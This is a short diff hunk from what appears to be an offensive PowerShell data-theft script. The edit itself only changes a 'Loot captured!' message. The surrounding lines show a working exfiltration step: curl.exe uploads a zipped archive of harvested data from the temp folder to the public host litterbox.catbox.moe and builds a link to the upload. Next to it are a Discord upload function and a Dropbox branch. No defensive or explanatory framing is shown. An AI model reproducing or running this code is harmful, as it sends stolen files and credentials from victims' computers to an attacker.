@@ -1663,7 +1663,7 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 ############################################################################################################################################################
 
 # Upload file to temp file storage
-$text = "Loot captured! Here is the URL (It expires in 12 hours): "
+$text = "**Final Data**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 function Upload-Discord {
